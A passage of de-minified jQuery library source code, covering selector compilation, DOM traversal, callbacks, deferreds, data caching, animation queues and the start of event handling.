                    if ((n && n(v, m, s, u), r)) for (l = ew(m, d), r(l, [], s, u), c = l.length; c--; ) (f = l[c]) && (m[d[c]] = !(v[d[c]] = f));
                    if (o) {
                        if (i || e) {
                            if (i) {
                                for (l = [], c = m.length; c--; ) (f = m[c]) && l.push((v[c] = f));
                                i(null, (m = []), l, u);
                            }
                            for (c = m.length; c--; ) (f = m[c]) && (l = i ? P(o, f) : p[c]) > -1 && (o[l] = !(a[l] = f));
                        }
                    } else (m = ew(m === a ? m.splice(h, m.length) : m)), i ? i(null, a, m, u) : L.apply(a, m);
                })
            );
        }
        function ek(e) {
            for (
                var t,
                    n,
                    i,
                    o = e.length,
                    a = r.relative[e[0].type],
                    s = a || r.relative[" "],
                    u = a ? 1 : 0,
                    c = e_(
                        function (e) {
                            return e === t;
                        },
                        s,
                        !0
                    ),
                    f = e_(
                        function (e) {
                            return P(t, e) > -1;
                        },
                        s,
                        !0
                    ),
                    p = [
                        function (e, n, r) {
                            var i = (!a && (r || n !== l)) || ((t = n).nodeType ? c(e, n, r) : f(e, n, r));
                            return (t = null), i;
                        },
                    ];
                u < o;
                u++
            )
                if ((n = r.relative[e[u].type])) p = [e_(eT(p), n)];
                else {
                    if ((n = r.filter[e[u].type].apply(null, e[u].matches))[b]) {
                        for (i = ++u; i < o && !r.relative[e[i].type]; i++);
                        return eC(u > 1 && eT(p), u > 1 && eb(e.slice(0, u - 1).concat({ value: " " === e[u - 2].type ? "*" : "" })).replace(F, "$1"), n, u < i && ek(e.slice(u, i)), i < o && ek((e = e.slice(i))), i < o && eb(e));
                    }
                    p.push(n);
                }
            return eT(p);
        }
        return (
            (ex.prototype = r.filters = r.pseudos),
            (r.setFilters = new ex()),
            (a = el.tokenize = function (e, t) {
                var n,
                    i,
                    o,
                    a,
                    s,
                    u,
                    l,
                    c = k[e + " "];
                if (c) return t ? 0 : c.slice(0);
                for (s = e, u = [], l = r.preFilter; s; ) {
                    for (a in ((!n || (i = z.exec(s))) && (i && (s = s.slice(i[0].length) || s), u.push((o = []))),
                    (n = !1),
                    (i = X.exec(s)) && ((n = i.shift()), o.push({ value: n, type: i[0].replace(F, " ") }), (s = s.slice(n.length))),
                    r.filter))
                        (i = Y[a].exec(s)) && (!l[a] || (i = l[a](i))) && ((n = i.shift()), o.push({ value: n, type: a, matches: i }), (s = s.slice(n.length)));
                    if (!n) break;
                }
                return t ? s.length : s ? el.error(e) : k(e, u).slice(0);
            }),
            (s = el.compile = function (e, t) {
                var n,
                    i,
                    o,
                    s,
                    u,
                    c,
                    f = [],
                    h = [],
                    v = S[e + " "];
                if (!v) {
                    for (t || (t = a(e)), c = t.length; c--; ) (v = ek(t[c]))[b] ? f.push(v) : h.push(v);
                    (v = S(
                        e,
                        ((n = h),
                        (o = (i = f).length > 0),
                        (s = n.length > 0),
                        (u = function (e, t, a, u, c) {
                            var f,
                                h,
                                v,
                                m = 0,
                                y = "0",
                                x = e && [],
                                b = [],
                                _ = l,
                                w = e || (s && r.find.TAG("*", c)),
                                C = (T += null == _ ? 1 : Math.random() || 0.1),
                                k = w.length;
                            for (c && (l = t == d || t || c); y !== k && null != (f = w[y]); y++) {
                                if (s && f) {
                                    for (h = 0, t || f.ownerDocument == d || (p(f), (a = !g)); (v = n[h++]); )
                                        if (v(f, t || d, a)) {
                                            u.push(f);
                                            break;
                                        }
                                    c && (T = C);
                                }
                                o && ((f = !v && f) && m--, e && x.push(f));
                            }
                            if (((m += y), o && y !== m)) {
                                for (h = 0; (v = i[h++]); ) v(x, b, t, a);
                                if (e) {
                                    if (m > 0) for (; y--; ) x[y] || b[y] || (b[y] = j.call(u));
                                    b = ew(b);
                                }
                                L.apply(u, b), c && !e && b.length > 0 && m + i.length > 1 && el.uniqueSort(u);
                            }
                            return c && ((T = C), (l = _)), x;
                        }),
                        o ? ef(u) : u)
                    )).selector = e;
                }
                return v;
            }),
            (u = el.select = function (e, t, n, i) {
                var o,
                    u,
                    l,
                    c,
                    f,
                    p = "function" == typeof e && e,
                    d = !i && a((e = p.selector || e));
                if (((n = n || []), 1 === d.length)) {
                    if ((u = d[0] = d[0].slice(0)).length > 2 && "ID" === (l = u[0]).type && 9 === t.nodeType && g && r.relative[u[1].type]) {
                        if (!(t = (r.find.ID(l.matches[0].replace(en, er), t) || [])[0])) return n;
                        p && (t = t.parentNode), (e = e.slice(u.shift().value.length));
                    }
                    for (o = Y.needsContext.test(e) ? 0 : u.length; o-- && ((l = u[o]), !r.relative[(c = l.type)]); )
                        if ((f = r.find[c]) && (i = f(l.matches[0].replace(en, er), (et.test(u[0].type) && e$(t.parentNode)) || t))) {
                            if ((u.splice(o, 1), !(e = i.length && eb(u)))) return L.apply(n, i), n;
                            break;
                        }
                }
                return (p || s(e, d))(i, t, !g, n, !t || (et.test(e) && e$(t.parentNode)) || t), n;
            }),
            (n.sortStable = b.split("").sort(N).join("") === b),
            (n.detectDuplicates = !!f),
            p(),
            (n.sortDetached = ep(function (e) {
                return 1 & e.compareDocumentPosition(d.createElement("fieldset"));
            })),
            ep(function (e) {
                return (e.innerHTML = "<a href='#'></a>"), "#" === e.firstChild.getAttribute("href");
            }) ||
                ed("type|href|height|width", function (e, t, n) {
                    if (!n) return e.getAttribute(t, "type" === t.toLowerCase() ? 1 : 2);
                }),
            (n.attributes &&
                ep(function (e) {
                    return (e.innerHTML = "<input/>"), e.firstChild.setAttribute("value", ""), "" === e.firstChild.getAttribute("value");
                })) ||
                ed("value", function (e, t, n) {
                    if (!n && "input" === e.nodeName.toLowerCase()) return e.defaultValue;
                }),
            ep(function (e) {
                return null == e.getAttribute("disabled");
            }) ||
                ed(O, function (e, t, n) {
                    var r;
                    if (!n) return !0 === e[t] ? t.toLowerCase() : (r = e.getAttributeNode(t)) && r.specified ? r.value : null;
                }),
            el
        );
    })(e);
    (b.find = T), (b.expr = T.selectors), (b.expr[":"] = b.expr.pseudos), (b.uniqueSort = b.unique = T.uniqueSort), (b.text = T.getText), (b.isXMLDoc = T.isXML), (b.contains = T.contains), (b.escapeSelector = T.escape);
    var w = function (e, t, n) {
            for (var r = [], i = void 0 !== n; (e = e[t]) && 9 !== e.nodeType; )
                if (1 === e.nodeType) {
                    if (i && b(e).is(n)) break;
                    r.push(e);
                }
            return r;
        },
        C = function (e, t) {
            for (var n = []; e; e = e.nextSibling) 1 === e.nodeType && e !== t && n.push(e);
            return n;
        },
        k = b.expr.match.needsContext;
    function S(e, t) {
        return e.nodeName && e.nodeName.toLowerCase() === t.toLowerCase();
    }
    var E = /^<([a-z][^\/\0>:\x20\t\r\n\f]*)[\x20\t\r\n\f]*\/?>(?:<\/\1>|)$/i;
    function N(e, t, n) {
        return h(t)
            ? b.grep(e, function (e, r) {
                  return !!t.call(e, r, e) !== n;
              })
            : t.nodeType
            ? b.grep(e, function (e) {
                  return (e === t) !== n;
              })
            : "string" != typeof t
            ? b.grep(e, function (e) {
                  return s.call(t, e) > -1 !== n;
              })
            : b.filter(t, e, n);
    }
    (b.filter = function (e, t, n) {
        var r = t[0];
        return (
            n && (e = ":not(" + e + ")"),
            1 === t.length && 1 === r.nodeType
                ? b.find.matchesSelector(r, e)
                    ? [r]
                    : []
                : b.find.matches(
                      e,
                      b.grep(t, function (e) {
                          return 1 === e.nodeType;
                      })
                  )
        );
    }),
        b.fn.extend({
            find: function (e) {
                var t,
                    n,
                    r = this.length,
                    i = this;
                if ("string" != typeof e)
                    return this.pushStack(
                        b(e).filter(function () {
                            for (t = 0; t < r; t++) if (b.contains(i[t], this)) return !0;
                        })
                    );
                for (n = this.pushStack([]), t = 0; t < r; t++) b.find(e, i[t], n);
                return r > 1 ? b.uniqueSort(n) : n;
            },
            filter: function (e) {
                return this.pushStack(N(this, e || [], !1));
            },
            not: function (e) {
                return this.pushStack(N(this, e || [], !0));
            },
            is: function (e) {
                return !!N(this, "string" == typeof e && k.test(e) ? b(e) : e || [], !1).length;
            },
        });
    var A,
        D = /^(?:\s*(<[\w\W]+>)[^>]*|#([\w-]+))$/;
    ((b.fn.init = function (e, t, n) {
        var r, i;
        if (!e) return this;
        if (((n = n || A), "string" == typeof e)) {
            if (!(r = "<" === e[0] && ">" === e[e.length - 1] && e.length >= 3 ? [null, e, null] : D.exec(e)) || (!r[1] && t)) return !t || t.jquery ? (t || n).find(e) : this.constructor(t).find(e);
            if (r[1]) {
                if (((t = t instanceof b ? t[0] : t), b.merge(this, b.parseHTML(r[1], t && t.nodeType ? t.ownerDocument || t : v, !0)), E.test(r[1]) && b.isPlainObject(t))) for (r in t) h(this[r]) ? this[r](t[r]) : this.attr(r, t[r]);
                return this;
            }
            return (i = v.getElementById(r[2])) && ((this[0] = i), (this.length = 1)), this;
        }
        return e.nodeType ? ((this[0] = e), (this.length = 1), this) : h(e) ? (void 0 !== n.ready ? n.ready(e) : e(b)) : b.makeArray(e, this);
    }).prototype = b.fn),
        (A = b(v));
    var j = /^(?:parents|prev(?:Until|All))/,
        q = { children: !0, contents: !0, next: !0, prev: !0 };
    function L(e, t) {
        for (; (e = e[t]) && 1 !== e.nodeType; );
        return e;
    }
    b.fn.extend({
        has: function (e) {
            var t = b(e, this),
                n = t.length;
            return this.filter(function () {
                for (var e = 0; e < n; e++) if (b.contains(this, t[e])) return !0;
            });
        },
        closest: function (e, t) {
            var n,
                r = 0,
                i = this.length,
                o = [],
                a = "string" != typeof e && b(e);
            if (!k.test(e)) {
                for (; r < i; r++)
                    for (n = this[r]; n && n !== t; n = n.parentNode)
                        if (n.nodeType < 11 && (a ? a.index(n) > -1 : 1 === n.nodeType && b.find.matchesSelector(n, e))) {
                            o.push(n);
                            break;
                        }
            }
            return this.pushStack(o.length > 1 ? b.uniqueSort(o) : o);
        },
        index: function (e) {
            return e ? ("string" == typeof e ? s.call(b(e), this[0]) : s.call(this, e.jquery ? e[0] : e)) : this[0] && this[0].parentNode ? this.first().prevAll().length : -1;
        },
        add: function (e, t) {
            return this.pushStack(b.uniqueSort(b.merge(this.get(), b(e, t))));
        },
        addBack: function (e) {
            return this.add(null == e ? this.prevObject : this.prevObject.filter(e));
        },
    }),
        b.each(
            {
                parent: function (e) {
                    var t = e.parentNode;
                    return t && 11 !== t.nodeType ? t : null;
                },
                parents: function (e) {
                    return w(e, "parentNode");
                },
                parentsUntil: function (e, t, n) {
                    return w(e, "parentNode", n);
                },
                next: function (e) {
                    return L(e, "nextSibling");
                },
                prev: function (e) {
                    return L(e, "previousSibling");
                },
                nextAll: function (e) {
                    return w(e, "nextSibling");
                },
                prevAll: function (e) {
                    return w(e, "previousSibling");
                },
                nextUntil: function (e, t, n) {
                    return w(e, "nextSibling", n);
                },
                prevUntil: function (e, t, n) {
                    return w(e, "previousSibling", n);
                },
                siblings: function (e) {
                    return C((e.parentNode || {}).firstChild, e);
                },
                children: function (e) {
                    return C(e.firstChild);
                },
                contents: function (e) {
                    return null != e.contentDocument && r(e.contentDocument) ? e.contentDocument : (S(e, "template") && (e = e.content || e), b.merge([], e.childNodes));
                },
            },
            function (e, t) {
                b.fn[e] = function (n, r) {
                    var i = b.map(this, t, n);
                    return "Until" !== e.slice(-5) && (r = n), r && "string" == typeof r && (i = b.filter(r, i)), this.length > 1 && (q[e] || b.uniqueSort(i), j.test(e) && i.reverse()), this.pushStack(i);
                };
            }
        );
    var H = /[^\x20\t\r\n\f]+/g;
    function P(e) {
        return e;
    }
    function O(e) {
        throw e;
    }
    function I(e, t, n, r) {
        var i;
        try {
            e && h((i = e.promise)) ? i.call(e).done(t).fail(n) : e && h((i = e.then)) ? i.call(e, t, n) : t.apply(void 0, [e].slice(r));
        } catch (o) {
            n.apply(void 0, [o]);
        }
    }
    (b.Callbacks = function (e) {
        e =
            "string" == typeof e
                ? ((t = e),
                  (n = {}),
                  b.each(t.match(H) || [], function (e, t) {
                      n[t] = !0;
                  }),
                  n)
                : b.extend({}, e);
        var t,
            n,
            r,
            i,
            o,
            a,
            s = [],
            u = [],
            l = -1,
            c = function () {
                for (a = a || e.once, o = r = !0; u.length; l = -1) for (i = u.shift(); ++l < s.length; ) !1 === s[l].apply(i[0], i[1]) && e.stopOnFalse && ((l = s.length), (i = !1));
                e.memory || (i = !1), (r = !1), a && (s = i ? [] : "");
            },
            f = {
                add: function () {
                    return (
                        s &&
                            (i && !r && ((l = s.length - 1), u.push(i)),
                            (function t(n) {
                                b.each(n, function (n, r) {
                                    h(r) ? (e.unique && f.has(r)) || s.push(r) : r && r.length && "string" !== x(r) && t(r);
                                });
                            })(arguments),
                            i && !r && c()),
                        this
                    );
                },
                remove: function () {
                    return (
                        b.each(arguments, function (e, t) {
                            for (var n; (n = b.inArray(t, s, n)) > -1; ) s.splice(n, 1), n <= l && l--;
                        }),
                        this
                    );
                },
                has: function (e) {
                    return e ? b.inArray(e, s) > -1 : s.length > 0;
                },
                empty: function () {
                    return s && (s = []), this;
                },
                disable: function () {
                    return (a = u = []), (s = i = ""), this;
                },
                disabled: function () {
                    return !s;
                },
                lock: function () {
                    return (a = u = []), i || r || (s = i = ""), this;
                },
                locked: function () {
                    return !!a;
                },
                fireWith: function (e, t) {
                    return a || ((t = [e, (t = t || []).slice ? t.slice() : t]), u.push(t), r || c()), this;
                },
                fire: function () {
                    return f.fireWith(this, arguments), this;
                },
                fired: function () {
                    return !!o;
                },
            };
        return f;
    }),
        b.extend({
            Deferred: function (t) {
                var n = [
                        ["notify", "progress", b.Callbacks("memory"), b.Callbacks("memory"), 2],
                        ["resolve", "done", b.Callbacks("once memory"), b.Callbacks("once memory"), 0, "resolved"],
                        ["reject", "fail", b.Callbacks("once memory"), b.Callbacks("once memory"), 1, "rejected"],
                    ],
                    r = "pending",
                    i = {
                        state: function () {
                            return r;
                        },
                        always: function () {
                            return o.done(arguments).fail(arguments), this;
                        },
                        catch: function (e) {
                            return i.then(null, e);
                        },
                        pipe: function () {
                            var e = arguments;
                            return b
                                .Deferred(function (t) {
                                    b.each(n, function (n, r) {
                                        var i = h(e[r[4]]) && e[r[4]];
                                        o[r[1]](function () {
                                            var e = i && i.apply(this, arguments);
                                            e && h(e.promise) ? e.promise().progress(t.notify).done(t.resolve).fail(t.reject) : t[r[0] + "With"](this, i ? [e] : arguments);
                                        });
                                    }),
                                        (e = null);
                                })
                                .promise();
                        },
                        then: function (t, r, i) {
                            var o = 0;
                            function a(t, n, r, i) {
                                return function () {
                                    var s = this,
                                        u = arguments,
                                        l = function () {
                                            var e, l;
                                            if (!(t < o)) {
                                                if ((e = r.apply(s, u)) === n.promise()) throw TypeError("Thenable self-resolution");
                                                h((l = e && ("object" == typeof e || "function" == typeof e) && e.then))
                                                    ? i
                                                        ? l.call(e, a(o, n, P, i), a(o, n, O, i))
                                                        : (o++, l.call(e, a(o, n, P, i), a(o, n, O, i), a(o, n, P, n.notifyWith)))
                                                    : (r !== P && ((s = void 0), (u = [e])), (i || n.resolveWith)(s, u));
                                            }
                                        },
                                        c = i
                                            ? l
                                            : function () {
                                                  try {
                                                      l();
                                                  } catch (e) {
                                                      b.Deferred.exceptionHook && b.Deferred.exceptionHook(e, c.stackTrace), t + 1 >= o && (r !== O && ((s = void 0), (u = [e])), n.rejectWith(s, u));
                                                  }
                                              };
                                    t ? c() : (b.Deferred.getStackHook && (c.stackTrace = b.Deferred.getStackHook()), e.setTimeout(c));
                                };
                            }
                            return b
                                .Deferred(function (e) {
                                    n[0][3].add(a(0, e, h(i) ? i : P, e.notifyWith)), n[1][3].add(a(0, e, h(t) ? t : P)), n[2][3].add(a(0, e, h(r) ? r : O));
                                })
                                .promise();
                        },
                        promise: function (e) {
                            return null != e ? b.extend(e, i) : i;
                        },
                    },
                    o = {};
                return (
                    b.each(n, function (e, t) {
                        var a = t[2],
                            s = t[5];
                        (i[t[1]] = a.add),
                            s &&
                                a.add(
                                    function () {
                                        r = s;
                                    },
                                    n[3 - e][2].disable,
                                    n[3 - e][3].disable,
                                    n[0][2].lock,
                                    n[0][3].lock
                                ),
                            a.add(t[3].fire),
                            (o[t[0]] = function () {
                                return o[t[0] + "With"](this === o ? void 0 : this, arguments), this;
                            }),
                            (o[t[0] + "With"] = a.fireWith);
                    }),
                    i.promise(o),
                    t && t.call(o, o),
                    o
                );
            },
            when: function (e) {
                var t = arguments.length,
                    n = t,
                    r = Array(n),
                    o = i.call(arguments),
                    a = b.Deferred(),
                    s = function (e) {
                        return function (n) {
                            (r[e] = this), (o[e] = arguments.length > 1 ? i.call(arguments) : n), --t || a.resolveWith(r, o);
                        };
                    };
                if (t <= 1 && (I(e, a.done(s(n)).resolve, a.reject, !t), "pending" === a.state() || h(o[n] && o[n].then))) return a.then();
                for (; n--; ) I(o[n], s(n), a.reject);
                return a.promise();
            },
        });
    var M = /^(Eval|Internal|Range|Reference|Syntax|Type|URI)Error$/;
    (b.Deferred.exceptionHook = function (t, n) {
        e.console && e.console.warn && t && M.test(t.name) && e.console.warn("jQuery.Deferred exception: " + t.message, t.stack, n);
    }),
        (b.readyException = function (t) {
            e.setTimeout(function () {
                throw t;
            });
        });
    var W = b.Deferred();
    function B() {
        v.removeEventListener("DOMContentLoaded", B), e.removeEventListener("load", B), b.ready();
    }
    (b.fn.ready = function (e) {
        return (
            W.then(e).catch(function (e) {
                b.readyException(e);
            }),
            this
        );
    }),
        b.extend({
            isReady: !1,
            readyWait: 1,
            ready: function (e) {
                (!0 === e ? --b.readyWait : b.isReady) || ((b.isReady = !0), (!0 !== e && --b.readyWait > 0) || W.resolveWith(v, [b]));
            },
        }),
        (b.ready.then = W.then),
        "complete" !== v.readyState && ("loading" === v.readyState || v.documentElement.doScroll) ? (v.addEventListener("DOMContentLoaded", B), e.addEventListener("load", B)) : e.setTimeout(b.ready);
    var R = function (e, t, n, r, i, o, a) {
            var s = 0,
                u = e.length,
                l = null == n;
            if ("object" === x(n)) for (s in ((i = !0), n)) R(e, t, s, n[s], !0, o, a);
            else if (
                void 0 !== r &&
                ((i = !0),
                h(r) || (a = !0),
                l &&
                    (a
                        ? (t.call(e, r), (t = null))
                        : ((l = t),
                          (t = function (e, t, n) {
                              return l.call(b(e), n);
                          }))),
                t)
            )
                for (; s < u; s++) t(e[s], n, a ? r : r.call(e[s], s, t(e[s], n)));
            return i ? e : l ? t.call(e) : u ? t(e[0], n) : o;
        },
        F = /^-ms-/,
        z = /-([a-z])/g;
    function X(e, t) {
        return t.toUpperCase();
    }
    function U(e) {
        return e.replace(F, "ms-").replace(z, X);
    }
    var V = function (e) {
        return 1 === e.nodeType || 9 === e.nodeType || !+e.nodeType;
    };
    function G() {
        this.expando = b.expando + G.uid++;
    }
    (G.uid = 1),
        (G.prototype = {
            cache: function (e) {
                var t = e[this.expando];
                return t || ((t = {}), V(e) && (e.nodeType ? (e[this.expando] = t) : Object.defineProperty(e, this.expando, { value: t, configurable: !0 }))), t;
            },
            set: function (e, t, n) {
                var r,
                    i = this.cache(e);
                if ("string" == typeof t) i[U(t)] = n;
                else for (r in t) i[U(r)] = t[r];
                return i;
            },
            get: function (e, t) {
                return void 0 === t ? this.cache(e) : e[this.expando] && e[this.expando][U(t)];
            },
            access: function (e, t, n) {
                return void 0 === t || (t && "string" == typeof t && void 0 === n) ? this.get(e, t) : (this.set(e, t, n), void 0 !== n ? n : t);
            },
            remove: function (e, t) {
                var n,
                    r = e[this.expando];
                if (void 0 !== r) {
                    if (void 0 !== t) for (n = (t = Array.isArray(t) ? t.map(U) : ((t = U(t)) in r) ? [t] : t.match(H) || []).length; n--; ) delete r[t[n]];
                    (void 0 === t || b.isEmptyObject(r)) && (e.nodeType ? (e[this.expando] = void 0) : delete e[this.expando]);
                }
            },
            hasData: function (e) {
                var t = e[this.expando];
                return void 0 !== t && !b.isEmptyObject(t);
            },
        });
    var Y = new G(),
        Q = new G(),
        K = /^(?:\{[\w\W]*\}|\[[\w\W]*\])$/,
        J = /[A-Z]/g;
    function Z(e, t, n) {
        var r, i;
        if (void 0 === n && 1 === e.nodeType) {
            if (((r = "data-" + t.replace(J, "-$&").toLowerCase()), "string" == typeof (n = e.getAttribute(r)))) {
                try {
                    n = ((i = n), "true" === i || ("false" !== i && ("null" === i ? null : i === +i + "" ? +i : K.test(i) ? JSON.parse(i) : i)));
                } catch (o) {}
                Q.set(e, t, n);
            } else n = void 0;
        }
        return n;
    }
    b.extend({
        hasData: function (e) {
            return Q.hasData(e) || Y.hasData(e);
        },
        data: function (e, t, n) {
            return Q.access(e, t, n);
        },
        removeData: function (e, t) {
            Q.remove(e, t);
        },
        _data: function (e, t, n) {
            return Y.access(e, t, n);
        },
        _removeData: function (e, t) {
            Y.remove(e, t);
        },
    }),
        b.fn.extend({
            data: function (e, t) {
                var n,
                    r,
                    i,
                    o = this[0],
                    a = o && o.attributes;
                if (void 0 === e) {
                    if (this.length && ((i = Q.get(o)), 1 === o.nodeType && !Y.get(o, "hasDataAttrs"))) {
                        for (n = a.length; n--; ) a[n] && 0 === (r = a[n].name).indexOf("data-") && Z(o, (r = U(r.slice(5))), i[r]);
                        Y.set(o, "hasDataAttrs", !0);
                    }
                    return i;
                }
                return "object" == typeof e
                    ? this.each(function () {
                          Q.set(this, e);
                      })
                    : R(
                          this,
                          function (t) {
                              var n;
                              if (o && void 0 === t) return void 0 !== (n = Q.get(o, e)) ? n : void 0 !== (n = Z(o, e)) ? n : void 0;
                              this.each(function () {
                                  Q.set(this, e, t);
                              });
                          },
                          null,
                          t,
                          arguments.length > 1,
                          null,
                          !0
                      );
            },
            removeData: function (e) {
                return this.each(function () {
                    Q.remove(this, e);
                });
            },
        }),
        b.extend({
            queue: function (e, t, n) {
                var r;
                if (e) return (t = (t || "fx") + "queue"), (r = Y.get(e, t)), n && (!r || Array.isArray(n) ? (r = Y.access(e, t, b.makeArray(n))) : r.push(n)), r || [];
            },
            dequeue: function (e, t) {
                t = t || "fx";
                var n = b.queue(e, t),
                    r = n.length,
                    i = n.shift(),
                    o = b._queueHooks(e, t);
                "inprogress" === i && ((i = n.shift()), r--),
                    i &&
                        ("fx" === t && n.unshift("inprogress"),
                        delete o.stop,
                        i.call(
                            e,
                            function () {
                                b.dequeue(e, t);
                            },
                            o
                        )),
                    !r && o && o.empty.fire();
            },
            _queueHooks: function (e, t) {
                var n = t + "queueHooks";
                return (
                    Y.get(e, n) ||
                    Y.access(e, n, {
                        empty: b.Callbacks("once memory").add(function () {
                            Y.remove(e, [t + "queue", n]);
                        }),
                    })
                );
            },
        }),
        b.fn.extend({
            queue: function (e, t) {
                var n = 2;
                return (
                    "string" != typeof e && ((t = e), (e = "fx"), n--),
                    arguments.length < n
                        ? b.queue(this[0], e)
                        : void 0 === t
                        ? this
                        : this.each(function () {
                              var n = b.queue(this, e, t);
                              b._queueHooks(this, e), "fx" === e && "inprogress" !== n[0] && b.dequeue(this, e);
                          })
                );
            },
            dequeue: function (e) {
                return this.each(function () {
                    b.dequeue(this, e);
                });
            },
            clearQueue: function (e) {
                return this.queue(e || "fx", []);
            },
            promise: function (e, t) {
                var n,
                    r = 1,
                    i = b.Deferred(),
                    o = this,
                    a = this.length,
                    s = function () {
                        --r || i.resolveWith(o, [o]);
                    };
                for ("string" != typeof e && ((t = e), (e = void 0)), e = e || "fx"; a--; ) (n = Y.get(o[a], e + "queueHooks")) && n.empty && (r++, n.empty.add(s));
                return s(), i.promise(t);
            },
        });
    var ee = /[+-]?(?:\d*\.|)\d+(?:[eE][+-]?\d+|)/.source,
        et = RegExp("^(?:([+-])=|)(" + ee + ")([a-z%]*)$", "i"),
        en = ["Top", "Right", "Bottom", "Left"],
        er = v.documentElement,
        ei = function (e) {
            return b.contains(e.ownerDocument, e);
        },
        eo = { composed: !0 };
    er.getRootNode &&
        (ei = function (e) {
            return b.contains(e.ownerDocument, e) || e.getRootNode(eo) === e.ownerDocument;
        });
    var ea = function (e, t) {
        return "none" === (e = t || e).style.display || ("" === e.style.display && ei(e) && "none" === b.css(e, "display"));
    };
    function es(e, t, n, r) {
        var i,
            o,
            a = 20,
            s = r
                ? function () {
                      return r.cur();
                  }
                : function () {
                      return b.css(e, t, "");
                  },
            u = s(),
            l = (n && n[3]) || (b.cssNumber[t] ? "" : "px"),
            c = e.nodeType && (b.cssNumber[t] || ("px" !== l && +u)) && et.exec(b.css(e, t));
        if (c && c[3] !== l) {
            for (u /= 2, l = l || c[3], c = +u || 1; a--; ) b.style(e, t, c + l), (1 - o) * (1 - (o = s() / u || 0.5)) <= 0 && (a = 0), (c /= o);
            (c *= 2), b.style(e, t, c + l), (n = n || []);
        }
        return n && ((c = +c || +u || 0), (i = n[1] ? c + (n[1] + 1) * n[2] : +n[2]), r && ((r.unit = l), (r.start = c), (r.end = i))), i;
    }
    var eu = {};
    function el(e) {
        var t,
            n = e.ownerDocument,
            r = e.nodeName,
            i = eu[r];
        return i || ((t = n.body.appendChild(n.createElement(r))), (i = b.css(t, "display")), t.parentNode.removeChild(t), "none" === i && (i = "block"), (eu[r] = i), i);
    }
    function ec(e, t) {
        for (var n, r, i = [], o = 0, a = e.length; o < a; o++)
            (r = e[o]).style &&
                ((n = r.style.display),
                t ? ("none" === n && ((i[o] = Y.get(r, "display") || null), i[o] || (r.style.display = "")), "" === r.style.display && ea(r) && (i[o] = el(r))) : "none" !== n && ((i[o] = "none"), Y.set(r, "display", n)));
        for (o = 0; o < a; o++) null != i[o] && (e[o].style.display = i[o]);
        return e;
    }
    b.fn.extend({
        show: function () {
            return ec(this, !0);
        },
        hide: function () {
            return ec(this);
        },
        toggle: function (e) {
            return "boolean" == typeof e
                ? e
                    ? this.show()
                    : this.hide()
                : this.each(function () {
                      ea(this) ? b(this).show() : b(this).hide();
                  });
        },
    });
    var ef,
        ep,
        ed = /^(?:checkbox|radio)$/i,
        eh = /<([a-z][^\/\0>\x20\t\r\n\f]*)/i,
        eg = /^$|^module$|\/(?:java|ecma)script/i;
    (ef = v.createDocumentFragment().appendChild(v.createElement("div"))),
        (ep = v.createElement("input")).setAttribute("type", "radio"),
        ep.setAttribute("checked", "checked"),
        ep.setAttribute("name", "t"),
        ef.appendChild(ep),
        (d.checkClone = ef.cloneNode(!0).cloneNode(!0).lastChild.checked),
        (ef.innerHTML = "<textarea>x</textarea>"),
        (d.noCloneChecked = !!ef.cloneNode(!0).lastChild.defaultValue),
        (ef.innerHTML = "<option></option>"),
        (d.option = !!ef.lastChild);
    var ev = { thead: [1, "<table>", "</table>"], col: [2, "<table><colgroup>", "</colgroup></table>"], tr: [2, "<table><tbody>", "</tbody></table>"], td: [3, "<table><tbody><tr>", "</tr></tbody></table>"], _default: [0, "", ""] };
    function em(e, t) {
        var n;
        return (n = void 0 !== e.getElementsByTagName ? e.getElementsByTagName(t || "*") : void 0 !== e.querySelectorAll ? e.querySelectorAll(t || "*") : []), void 0 === t || (t && S(e, t)) ? b.merge([e], n) : n;
    }
    function ey(e, t) {
        for (var n = 0, r = e.length; n < r; n++) Y.set(e[n], "globalEval", !t || Y.get(t[n], "globalEval"));
    }
    (ev.tbody = ev.tfoot = ev.colgroup = ev.caption = ev.thead), (ev.th = ev.td), d.option || (ev.optgroup = ev.option = [1, "<select multiple='multiple'>", "</select>"]);
    var e$ = /<|&#?\w+;/;
    function ex(e, t, n, r, i) {
        for (var o, a, s, u, l, c, f = t.createDocumentFragment(), p = [], d = 0, h = e.length; d < h; d++)
            if ((o = e[d]) || 0 === o) {
                if ("object" === x(o)) b.merge(p, o.nodeType ? [o] : o);
                else if (e$.test(o)) {
                    for (a = a || f.appendChild(t.createElement("div")), u = ev[(s = (eh.exec(o) || ["", ""])[1].toLowerCase())] || ev._default, a.innerHTML = u[1] + b.htmlPrefilter(o) + u[2], c = u[0]; c--; ) a = a.lastChild;
                    b.merge(p, a.childNodes), ((a = f.firstChild).textContent = "");
                } else p.push(t.createTextNode(o));
            }
        for (f.textContent = "", d = 0; (o = p[d++]); )
            if (r && b.inArray(o, r) > -1) i && i.push(o);
            else if (((l = ei(o)), (a = em(f.appendChild(o), "script")), l && ey(a), n)) for (c = 0; (o = a[c++]); ) eg.test(o.type || "") && n.push(o);
        return f;
    }
    var eb = /^([^.]*)(?:\.(.+)|)/;
    function e_() {
        return !0;
    }
    function eT() {
        return !1;
    }
    function ew(e, t) {
        return (
            (e ===
                (function () {
                    try {
                        return v.activeElement;
                    } catch (e) {}
                })()) ==
            ("focus" === t)
        );
    }
    function eC(e, t, n, r, i, o) {
        var a, s;
        if ("object" == typeof t) {
            for (s in ("string" != typeof n && ((r = r || n), (n = void 0)), t)) eC(e, s, n, r, t[s], o);
            return e;
        }
        if ((null == r && null == i ? ((i = n), (r = n = void 0)) : null == i && ("string" == typeof n ? ((i = r), (r = void 0)) : ((i = r), (r = n), (n = void 0))), !1 === i)) i = eT;
        else if (!i) return e;
        return (
            1 === o &&
                ((a = i),
                ((i = function (e) {
                    return b().off(e), a.apply(this, arguments);
                }).guid = a.guid || (a.guid = b.guid++))),
            e.each(function () {
                b.event.add(this, t, i, r, n);
            })
        );
    }
    function ek(e, t, n) {
        n
            ? (Y.set(e, t, !1),
              b.event.add(e, t, {
                  namespace: !1,
                  handler: function (e) {
                      var r,
                          o,
                          a = Y.get(this, t);
                      if (1 & e.isTrigger && this[t]) {
                          if (a.length) (b.event.special[t] || {}).delegateType && e.stopPropagation();
                          else if (((a = i.call(arguments)), Y.set(this, t, a), (r = n(this, t)), this[t](), a !== (o = Y.get(this, t)) || r ? Y.set(this, t, !1) : (o = {}), a !== o))
                              return e.stopImmediatePropagation(), e.preventDefault(), o && o.value;
                      } else a.length && (Y.set(this, t, { value: b.event.trigger(b.extend(a[0], b.Event.prototype), a.slice(1), this) }), e.stopImmediatePropagation());
                  },
              }))
            : void 0 === Y.get(e, t) && b.event.add(e, t, e_);
    }
    (b.event = {
        global: {},
        add: function (e, t, n, r, i) {
            var o,
